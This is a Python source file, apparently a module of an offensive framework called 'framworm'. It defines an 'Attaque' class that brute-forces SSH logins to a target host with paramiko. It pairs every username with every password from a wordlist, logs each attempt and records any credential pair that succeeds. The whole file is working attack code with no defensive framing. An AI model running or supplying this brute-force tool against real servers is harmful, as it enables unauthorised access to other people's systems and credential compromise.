from .abstract import Abstract
import paramiko

class Attaque(Abstract):
    def __init__(self, ref, host, port):
        Abstract.__init__(self, ref, host, port)
    
    def run(self):
        client = paramiko.SSHClient()
        with open("framworm/files/wordlists/rockworm.txt", "r") as wordlist:
            words = wordlist.readlines()
            for user in words:
                user = user.strip()
                for passwd in words:
                    passwd = passwd.strip()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        self.info(f"Try to connect with ssh to {self.host}:{self.port} with user={user},password={passwd}")
                        client.connect(self.host, port=self.port, username=user, password=passwd)
                        client.close()
                        self.bilan(f"ssh_bruteforce{[self.host, user,passwd]}")
                    except:
                        pass